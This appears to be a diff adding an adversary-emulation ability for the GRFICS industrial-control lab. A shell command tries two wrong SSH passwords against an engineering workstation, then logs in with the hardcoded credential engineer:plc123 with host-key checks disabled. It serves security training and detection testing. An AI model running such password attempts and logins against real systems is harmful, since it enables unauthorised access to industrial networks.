@@ -1,0 +1,29 @@
+---
+
+- id: a9b8c7d6-1010-1010-1010-000000000001
+  name: SSH to EWS - Brute Simulation then Valid Login
+  description: |
+    From the Kali attacker host (DMZ), attempts two deliberately wrong SSH passwords
+    against the GRFICS engineering workstation (192.168.95.5), then authenticates
+    with engineer:plc123. Requires sshpass on the agent (apt-get install sshpass if missing).
+  tactic: initial-access
+  technique_id: T0866
+  technique_name: Exploitation of Remote Services
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      command -v sshpass >/dev/null 2>&1 ||
+      { echo "ERROR: sshpass not found — install with: apt-get update && apt-get install -y sshpass"; exit 1; } &&
+      EWS=192.168.95.5 &&
+      for bad in wrongpass1 wrongpass2; do
+        sshpass -p "$bad" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+        -o ConnectTimeout=8 engineer@${EWS} 'exit 0' 2>/dev/null &&
+        echo "UNEXPECTED_SUCCESS:$bad" ||
+        echo "EXPECTED_FAIL:$bad";
+      done &&
+      sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      -o ConnectTimeout=10 engineer@${EWS}
+      'echo SSH_SESSION_OK; hostname; whoami; uptime' &&
+      echo "SSH_LOGIN_SUCCESS"
+    timeout: 120
